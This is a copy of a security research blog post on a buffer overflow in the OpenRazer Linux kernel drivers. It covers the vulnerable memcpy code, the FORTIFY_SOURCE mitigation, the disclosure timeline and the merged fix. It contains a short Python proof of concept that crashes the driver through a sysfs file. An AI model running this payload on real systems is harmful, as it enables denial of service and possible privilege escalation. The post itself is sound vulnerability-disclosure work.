---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-09-14_colorful-vulnerabilities.md
original_filename: 2022-09-14_colorful-vulnerabilities.md
title: Colorful Vulnerabilities
category: documents
detected_topics:
- sso
- command-injection
- automation-abuse
- api-security
- supply-chain
tags:
- imported
- documents
- sso
- command-injection
- automation-abuse
- api-security
- supply-chain
language: en
raw_sha256: 6d66637b78888cbcb1dc8768e26f0376ad50714e0e7486dd59be6f0873766717
text_sha256: d5d2111a00c4064e59aded1628b746fa76cb353e5881d6a7fc2bda66ce94a00c
ingested_at: '2026-06-28T07:32:14Z'
sensitivity: unknown
redactions_applied: false
---

# Colorful Vulnerabilities

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-09-14_colorful-vulnerabilities.md
- Source Type: markdown
- Detected Topics: sso, command-injection, automation-abuse, api-security, supply-chain
- Ingested At: 2026-06-28T07:32:14Z
- Redactions Applied: False
- Raw SHA256: `6d66637b78888cbcb1dc8768e26f0376ad50714e0e7486dd59be6f0873766717`
- Text SHA256: `d5d2111a00c4064e59aded1628b746fa76cb353e5881d6a7fc2bda66ce94a00c`


## Content

---
title: "Colorful Vulnerabilities"
url: "https://www.cyberark.com/resources/threat-research-blog/colorful-vulnerabilities"
final_url: "https://www.cyberark.com/resources/threat-research-blog/colorful-vulnerabilities"
authors: ["Tal Lossos (@TalLossos)"]
programs: ["OpenRazer"]
bugs: ["Memory corruption", "Buffer Overflow"]
publication_date: "2022-09-14"
added_date: "2022-09-26"
source: "pentester.land/writeups.json"
original_index: 2171
---

# Colorful Vulnerabilities

September 14, 2022 Tal Lossos

  * Share this Article
  * [Facebook](https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.cyberark.com%2Fresources%2Fthreat-research-blog%2Fcolorful-vulnerabilities)
  * [Twitter](https://twitter.com/share?text=Colorful%20Vulnerabilities&url=https%3A%2F%2Fwww.cyberark.com%2Fresources%2Fthreat-research-blog%2Fcolorful-vulnerabilities&via=CyberArk)
  * [Email](/cdn-cgi/l/email-protection#6c531f190e06090f18512f030218090218495e5c0a1e0301495e5c0115495e5c24190e495e5d4a0d011c570e030815512f04090f07495e5c031918495e5c1b040d18495e5b1f495e5c040d1c1c090205020b495e5c0d18495e5c2f150e091e2d1e07495e5d495c2d495c2d2f0300031e0a1900495e5c3a190002091e0d0e0500051805091f495c2d23191e495e5c00031a09495e5c0a031e495e5c0b0d0105020b495e5c0d0003020b1f050809495e5c0a05020805020b495e5c0e190b1f495e5c000908495e5c191f495e5c0e0d0f07495e5c1803495e5c180409495e5c0b030308495e5c030049295e49545c495555495e5c1d19091f18050302495f2d495e5c251f495e5c0518495e5c181e1909495e5c18040d18495e5c180409495e5c01031e09495e5c3e2b2e495e5c0f0300031e1f495e5c150319495e5c040d1a09495e5c495e5409140f091c18495e5c0a031e495e5c1503191e495e5c0b0d0105020b495e5c0f040d051e495e2f495e5c030a495e5c0f03191e1f09495e55495e2f495e5c180409495e5c01031e09495e5c1f07050000424242495c2d495c2d0418181c1f495f2d495e2a495e2a1b1b1b420f150e091e0d1e07420f0301495e2a1e091f03191e0f091f495e2a18041e090d18411e091f090d1e0f04410e00030b495e2a0f0300031e0a1900411a190002091e0d0e0500051805091f)
  * [LinkedIn](https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fwww.cyberark.com%2Fresources%2Fthreat-research-blog%2Fcolorful-vulnerabilities&title=Colorful%20Vulnerabilities&summary=Our%20love%20for%20gaming%20alongside%20finding%20bugs%20led%20us%20back%20to%20the%20good%20ol%E2%80%99%20question%3A%20Is%20it%20true%20that%20the%20more%20RGB%20colors%20you%20have%20%28except%20for%20your%20gaming%20chair%2C%20of%20course%29%2C%20the%20more%20skill...)

![](https://www.cyberark.com/wp-content/uploads/2022/09/AdobeStock_191432286.jpeg)

Our love for gaming alongside finding bugs led us back to the good ol’ question: Is it true that the more RGB colors you have (except for your gaming chair, of course), the more skill and power you’ll have over your opponents? Or could it put you at a disadvantage?

Since we are always interested in finding vulnerabilities, we have recently started to research third-party Linux kernel drivers, one of which was OpenRazer [0] — an open-source driver for gaming devices produced by Razer. Finding any vulnerabilities in such a product has a significant impact due to the vast number of users.

### TL;DR

We have found a buffer overflow in the _OpenRazer_ open-source kernel drivers, which caused a Denial of Service and possibly Elevation of Privileges (CVE-2022-29021, CVE-2022-29022, CVE-2022-29023).

During the research, we encountered a newly added feature to the Linux Kernel, which is a part of _Fortify Source_ , that caused some weird behavior during the exploit development.

### Hunting for Bugs

When you’re using Razer products in a Linux environment, you’ll probably end up using [OpenRazer](https://openrazer.github.io/) — “An entirely open source driver and user-space daemon that allows you to manage your Razer peripherals on GNU/Linux” or, in human words, an application that lets you customize/manage your Razer products.

One of the best places to look for vulnerabilities in Linux is in kernel modules. They are always privileged, and therefore, every bug in them is essentially a bug in the kernel. In addition, kernel modules are far less examined and tested, as they are not considered a part of the core kernel. The most important thing we need to figure out is how to interact with them and then how we can affect their behavior from an unprivileged user standpoint.

OpenRazer has multiple drivers — in other words, kernel modules (_razreaccessory_ , _razerkbd_ , _razermouse_ and _razerkraken)_. Since the drivers are open-sourced, it’s relatively easy to discover how we can interact with them, if at all.

There are multiple ways to conduct vulnerability research, including reversing of the binary, fuzzing or even looking at the plain code. Good thing we’re using Linux, where most of the drivers are open sourced (even Nvidia as of 5/2022!! [1]). Therefore, we’ve decided to statically check the source code to better understand how the drivers are implemented.
  
  
  static struct hid_driver razer_kbd_driver = {
  .name = "razerkbd",
  .id_table = razer_devices,
  .input_mapping = razer_kbd_input_mapping,
  .probe = razer_kbd_probe,
  .remove = razer_kbd_disconnect,
  .event = razer_event,
  .raw_event = razer_raw_event,
  };
  
  module_hid_driver(razer_kbd_driver);
  

From a quick glimpse, we can see that the drivers are implemented as [USB-HID devices](https://www.kernel.org/doc/html/latest/hid/hiddev.html), which is a method of implementing USB devices that humans usually interact with, like keyboards, mice, etc.
  
  
  static DEVICE_ATTR(game_led_state,  0660, razer_attr_read_mode_game,  razer_attr_write_mode_game);
  static DEVICE_ATTR(macro_led_state,  0660, razer_attr_read_mode_macro,  razer_attr_write_mode_macro);
  ...
  static DEVICE_ATTR(version,  0440, razer_attr_read_version,  NULL);
  static DEVICE_ATTR(kbd_layout,  0440, razer_attr_read_kbd_layout,  NULL);
  static DEVICE_ATTR(firmware_version,  0440, razer_attr_read_get_firmware_version,  NULL);
  ...
  static DEVICE_ATTR(device_type,  0440, razer_attr_read_device_type,  NULL);
  static DEVICE_ATTR(device_mode,  0660, razer_attr_read_device_mode,  razer_attr_write_device_mode);
  static DEVICE_ATTR(device_serial,  0440, razer_attr_read_get_serial,  NULL);
  ...
  static DEVICE_ATTR(matrix_effect_none,  0220, NULL,  razer_attr_write_mode_none);
  ...
  static DEVICE_ATTR(matrix_custom_frame,  0220, NULL,  razer_attr_write_matrix_custom_frame);
  ...
  

Each driver exposes its functionalities via multiple _attribute files_[2]_._ The _attribute files_ reside in _sysfs,_ and each one of them matches a functionality implemented in the driver. In our case, the _attribute files_ are created by calling [_device_create_file_](https://elixir.bootlin.com/linux/v5.15/source/drivers/base/core.c#L2752) with attributes declared by the [_DEVICE_ATTR_](https://01.org/linuxgraphics/gfx-docs/drm/driver-api/driver-model/device.html) macro, which are:

  * _name_ – Represents the attribute file’s name
  * _mode_ – The permissions for attribute file
  * _show_ – Function for reading from the attribute file
  * _store_ – Function for writing to the attribute file

In the _razerkbd_ driver, for example, there are three types of _attribute files_ : files with only read permissions (_0440_), only write permissions (_0220_), and both read and write permissions (_0660_).

We first should check the _attribute files_ with _write_ permissions. The reason is that the buffer that we write to the _attribute file_ is normally used in the implemented function in the driver (the _store_ function). As a result, the potential for bugs is higher than when we don’t have _write_ permissions to the _attribute file_.

### The Vulnerability

One of the _attribute files_ with _write_ permissions of _razerkbd_ is _matrix_custom_frame_. From the [Github wiki](https://github.com/openrazer/openrazer/wiki/Using-the-keyboard-driver#matrix_custom_frame---sets-colour-of-keyboard-row-write-only) page of _OpenRazer_ , _matrix_custom_frame_ lets us set the colors of keyboard rows by passing a row index, column start, column stop and RGB values to the corresponding keys. For example, this will set the left “ _Ctrl_ ,” “ _WinKey_ ” and “ _alt_ ” keys to blue:
  
  
  BLUE = '\x00\x00\xff'
  
  with open('matrix_custom_frame', 'wb') as f:
  f.write(b'\x05\x00\x03' + BLUE * 4)
  
  with open('matrix_effect_custom', 'wb') as f:
  f.write('\x01')
  

The general flow of writing to _matrix_custom_frame_ is the following:
  
  
  static DEVICE_ATTR(matrix_custom_frame,  0220, NULL, razer_attr_write_matrix_custom_frame);  // 1
  
  ...
  
  static ssize_t razer_attr_write_matrix_custom_frame(struct device *dev, struct device_attribute *attr, const char *buf, size_t count)
  {
  struct usb_interface *intf = to_usb_interface(dev->parent);
  struct usb_device *usb_dev = interface_to_usbdev(intf);
  struct razer_report report = {0};
  size_t offset = 0;
  unsigned char row_id;
  unsigned char start_col;
  unsigned char stop_col;
  unsigned char row_length;
  
  while(offset < count) { 
  ... row_id = buf[offset++]; // 2 
  start_col = buf[offset++]; 
  stop_col = buf[offset++]; 
  row_length = ((stop_col+1) - start_col) * 3; 
  ... 
  switch(usb_dev->descriptor.idProduct) {
  case USB_DEVICE_ID_RAZER_ORNATA:
  ...
  case USB_DEVICE_ID_RAZER_CYNOSA_CHROMA_PRO:
  report = razer_chroma_extended_matrix_set_custom_frame(row_id, start_col, stop_col, (unsigned char*)&buf[offset]);  // 3
  break;
  ...
  razer_send_payload(usb_dev, &report);  // 8
  
  // *3 as its 3 bytes per col (RGB)
  offset += row_length;
  }
  
  return count;
  }
  

**1.** _razer_attr_write_matrix_custom_frame_ receives the buffer that we’re writing to _matrix_custom_frame_ as the _buf_ argument.  
**2.** Assigns _row_id_ _start_col_ and _stop_col_ as the first, second and third bytes from the _buf_ buffer, which we have complete control  
over, as they are user input.
  
  
  struct razer_report razer_chroma_extended_matrix_set_custom_frame(unsigned char row_index, unsigned char start_col, unsigned char stop_col, unsigned char *rgb_data)
  {
  return razer_chroma_extended_matrix_set_custom_frame2(row_index, start_col, stop_col, rgb_data, 0x47);
  }

**3.** Passes the row_id, start_col, stop_col and the _buf_ buffer, starting from the offset of the RGB data to razer_chroma_extended_matrix_set_custom_frame that calls  
razer_chroma_extended_matrix_set_custom_frame2.
  
  
  struct razer_report {
  unsigned char status;
  union transaction_id_union transaction_id;
  unsigned short remaining_packets;
  unsigned char protocol_type;
  unsigned char data_size;
  unsigned char command_class;
  union command_id_union command_id;
  unsigned char arguments[80];
  unsigned char crc;
  unsigned char reserved;
  };
  
  struct razer_report razer_chroma_extended_matrix_set_custom_frame2(unsigned char row_index, unsigned char start_col, unsigned char stop_col, unsigned char *rgb_data, size_t packetLength)
  {
  const size_t row_length = (size_t) (((stop_col + 1) - start_col) * 3);  // 4
  const size_t data_length = (packetLength != 0) ? packetLength : row_length + 5;
  struct razer_report report = get_razer_report(0x0F, 0x03, data_length);  // 5
  
  report.transaction_id.id = 0x3F;
  
  report.arguments[2] = row_index;  // 6
  report.arguments[3] = start_col;
  report.arguments[4] = stop_col;
  memcpy(&report.arguments[5], rgb_data, row_length);  // 7
  
  return report;
  }
  

**4.** Calculates the _row_length_ for the RGB values (each RGB value is three bytes long) based on _start_col_ and _stop_col_.  
**5.** Creates a new _razer_report_ via _get_razer_report_ that one of its members is a char array named _arguments_ with the length of 80.  
**6.** Puts the _row_id_(row_index), _start_col_ and _stop_col_ to the _arguments_ buffer.  
**7.** Copies _row_length_ bytes from the _buf_ buffer (_rgb_data)_ to the _arguments_ buffer.  
**8.** Sends the new _razer_report_ to the USB device.

Can you spot the problem here?

Since we have complete control over _row_length,_ which is then being used as the copy size to the arguments buffer in the _memcpy_ , by providing a size bigger than 80 we can overflow the _arguments_ buffer, as there is no validation whatsoever, thus gaining a classic case of a buffer overflow :).

If we check the other drivers in OpenRazer, we can see that both _razermouse_ and _razeraccessory_ implemented _matrix_custom_frame_ the same way. Hence, they suffer from the same bug.

#### Reversing

To understand which code actually runs, we need to reverse engineer the binary, as the compiler could add/change stuff from the original source code.

Our first step is to review how the kernel module was compiled and make sure we’ve compiled it with debug symbols for easier reversing (Check Environment Setup).

![](https://www.cyberark.com/wp-content/uploads/2022/09/1.png)

After reversing the relevant parts of the driver, the decompiled code looked quite similar compared to the source code, but an odd test was added that compares _row_length_ with _0x4D_ and calls _fortify_panic_ if _row_length_ is bigger than _0x4D_ :

![](https://www.cyberark.com/wp-content/uploads/2022/09/2.png)

What is this test, and what even is _0x4D_?

![](https://www.cyberark.com/wp-content/uploads/2022/09/3.png)

It’s apparent that _0x4D_ aka 77 is the space left in the _struct razer_report_ starting from the offset 5 in the _arguments_ buffer (which is the destination of the _memcpy_), so potentially, we could override both _crc_ and _reserved_ fields.

However, we know that the copy size, _row_length,_ in the _memcpy_ can’t be 76 or 77 bytes long because they are not a multiplication of 3 (code snippet 5-4).

Therefore, we can’t overwrite the _crc_ and the _reserved_ fields of the structure.

![](https://www.cyberark.com/wp-content/uploads/2022/09/4.png)

Usually, when we compile the drivers without _FORTIFY_SOURCE_ enabled on the machine, the odd test wasn’t there. So, what even is _fortify_panic_?

#### Fortify Source

The added compile-time function _fortify_panic_ made us think that it is a part of some mitigation (well, the name quite says it), and indeed, after a quick deep into the fountain of knowledge — Google — that mitigation was none other than _Fortify Source_.

Essentially, [_Fortify Source_](https://www.redhat.com/en/blog/enhance-application-security-fortifysource) is a feature originally from glibc that provides compile-time and run-time buffer overflow checks for potentially dangerous functions like _memcpy_ and _strcpy_. Unlike glibc, the Linux kernel implementation covers buffer reads in addition to writes.

At its core, _FORTIFY_SOURCE_ uses the compiler’s [___builtin_object_size()_](https://www.ibm.com/docs/en/xl-c-and-cpp-linux/16.1.0?topic=functions-builtin-object-size) to determine the available size at a target address based on the compile-time known structure layout.

___builtin_object_size()_ has multiple modes, and two of them are relevant to us:

Mode _0 –_ used for checking the outer bounds of the structure.

Mode _1 –_ used for checking the inner bounds of members in the structure.

For example [3]:
  
  
  struct object {
  u16 scalar1;	/* 2 bytes */
  char array[6];	/* 6 bytes */
  u64 scalar2;	/* 8 bytes */
  u32 scalar3;	/* 4 bytes */
  u32 scalar4;	/* 4 bytes */
  } instance;
  

__builtin_object_size(instance.array, 0) == 22, since the remaining size of the enclosing structure starting from the field _array_ is 22 bytes (6 + 8 + 4 + 4). __builtin_object_size(instance.array, 1) == 6, since the remaining size of the specific field _array_ is 6 bytes.

The [initial](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=6974f0c4555e285ab217cee58b6e874f776ff409) implementation of _FORTIFY_SOURCE_ in kernel v4.13 used ___builtin_object_size()_ with mode _0_ because there were many cases of both _strcpy_ and _memcpy_ functions being used to write (or read) across multiple fields in a structure. Indeed, this prevented overflows from reaching beyond the end of the structure; however, since structures are a continuous area in the memory, it didn’t protect against overwriting of neighbor structure fields.

In kernel v5.11, ___builtin_object_size()_ with mode _1_ [was turned on](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=6a39e62abbafd1d58d1722f40c7d26ef379c6a2f) for the _strcpy_ family of functions, and in kernel v5.18, ___builtin_object_size()_ with mode _1_ [was turned on](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f68f2ff91512c199ec24883001245912afc17873) for the _memcpy_ family of functions [4].

Therefore, compiling a kernel module on a machine with _FORTIFY_SOURCE_ enabled (_CONFIG_FORTIFY_SOURCE_) will have this mitigation enabled by default.
  
  
  __FORTIFY_INLINE void *memcpy(void *p, const void *q, __kernel_size_t size)
  {
  size_t p_size = __builtin_object_size(p, 0);
  size_t q_size = __builtin_object_size(q, 0);
  
  if (__builtin_constant_p(size)) {  // The size is known at compile-time
  if (p_size < size)
  __write_overflow();
  if (q_size < size)
  __read_overflow2();
  }
  if (p_size < size || q_size < size)
  fortify_panic(__func__);
  return __underlying_memcpy(p, q, size);
  }
  

_Fortify Source_ checks the code both in compile and run time:

![](https://www.cyberark.com/wp-content/uploads/2022/09/MicrosoftTeams-image-7.png)

For instance, in the _memcpy_ check, if the size is known at compile-time, there will be an error right away, which, of course, causes compilation failure.

![](https://www.cyberark.com/wp-content/uploads/2022/09/6.png)

Otherwise, if the size is determined at run time, a call to _fortify_panic_ will be triggered before out-of-bounds copy operation.
  
  
  void fortify_panic(const char *name)
  {
  pr_emerg("detected buffer overflow in %s\n", name);
  BUG();
  }
  

So, what does _fortify_panic_ do exactly? If we look at the source code in the kernel, we can see that it calls the [_BUG_](https://elixir.bootlin.com/linux/v5.15/source/arch/x86/include/asm/bug.h#L63) macro, which calls _unreachable_ and crashes the driver, which is way better than letting the attacker arbitrarily write code in the kernel.

### Exploitation

To exploit the vulnerability explained above, we must send a specially constructed buffer, which will cause _row_length_ to be bigger than 80. To do so, we can set _start_col_ to be _0x00_ and _stop_col_ to have a larger value than _0x18,_ so _row_length_ will exceed the size of the _arguments_ buffer and overflow the buffer.
  
  
  file_path = '/sys/bus/hid/devices/0003:1532:021E.0004/matrix_custom_frame'
  payload = b'\x00\x00\x19'
  payload += b'\x41' * 80
  
  
  def crash():
  with open(file_path, 'wb') as f:
  f.write(payload)
  
  
  if __name__ == '__main__':
  crash()
  

Running the code above crashes the driver, causing a DoS. The impact may be more severe if the driver was **not** compiled with _FORTIFY_SOURCE_ enabled. In this case, the attacker can chain this vulnerability with an information leak vulnerability, bypassing KASLR and stacking canary mitigations (if present). This leads to kernel control-flow hijack, which results in code execution in kernel space. Even without leveraging an information leak vulnerability, exploiting the bug in the absence of _FORTIFY_SOURCE_ would cause a system crash _._

### Environment Setup

All the work we’ve done was on an Ubuntu 20.04 kernel 5.13.

To install OpenRazer, you could either follow the steps in the [Download section](https://openrazer.github.io/#download) on the OpenRazer page or compile and install the drivers directly from the [Github ](https://github.com/openrazer/openrazer)[page](https://github.com/openrazer/openrazer). After installing, ensure the specific kernel module is loaded (_dmesg_).

To check whether the VM recognizes the Razer USB device, run “lsusb,” for example:

![](https://www.cyberark.com/wp-content/uploads/2022/09/7.png)

![](https://www.cyberark.com/wp-content/uploads/2022/09/8.png)

If you can’t see the Razer USB device, make sure the device is connected to the VM (USB and Bluetooth). If you can’t see the USB device, you might need to add the following to the “.vmx” file of the VM and restart the machine:
  
  
  
  usb.generic.allowHID = “TRUE”
  usb.generic.allowLastHID = “TRUE
  

![](https://www.cyberark.com/wp-content/uploads/2022/09/9.png)

After connecting the USB device successfully, you should have a new hid device under _/sys/bus/hid/devices_ for the connected device containing all the driver’s device files.
  
  
  # Driver compilation
  driver:
  @echo -e "\n::\033[32m Compiling OpenRazer kernel modules\033[0m"
  @echo "========================================"
  $(MAKE) -C $(KERNELDIR) M=$(DRIVERDIR) modules EXTRA_CFLAGS="-g -DDEBUG"
  

To simplify debugging, add debug symbols to the Makefile by adding **EXTRA_CFLAGS=”-g -DDEBUG”**.

### Summary

As part of this third-party Linux kernel drivers research, we’ve analyzed an open-source Linux driver for razer devices — OpenRazer. We’ve found a buffer overflow vulnerability that could be exploited to a Denial of Service and possibly Elevation of Privileges during our examination.

While developing the exploit, we encountered a newly added feature to the Linux Kernel that is a part of the _Fortify Source_ mitigation, which added strict bounds checking for _memcpy_.

This mitigation made exploiting vulnerabilities based on an out-of-bound _memcpy_ operation beyond a denial of service unlikely, thus, making our life much safer :).

### Patch

As part of the disclosure, we’ve submitted a [patch](https://github.com/openrazer/openrazer/pull/1790) for the described vulnerabilities, adding checks before _memcpy_ to prevent any overflow, which was merged soon after and was a part of the new release.

### Disclosure

  * April 3, 2022 – Bug found
  * April 4, 2022 – Reported to the OSS maintainer
  * April 8, 2022 – PR for fixing the vulnerable code was open
  * April 9, 2022 – Merged and a new release of OpenRazer was published (3.3.0)
  * May 20, 2022 – CVEs granted [5]: 
  * razerkbd – CVE-2022-29021
  * razeraccessory – CVE-2022-29022
  * razermouse – CVE-2022-29023

### References

[0] OpenRazer – <https://openrazer.github.io/>

[1] Nvidia’s open source – <https://github.com/NVIDIA/open-gpu-kernel-modules>

[2] sysfs attributes – <https://www.kernel.org/doc/html/latest/filesystems/sysfs.html#attributes>

[3] __builtin_object_size mode example – <https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f68f2ff91512c199ec24883001245912afc17873>

[4] Patch set for inner bounds _memcpy_ checks – <https://lwn.net/Articles/864521/>

[5] Granted CVEs – [CVE-2022-29021](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29021) [CVE-2022-29022 ](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29022)[CVE-2022-29023](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29023)
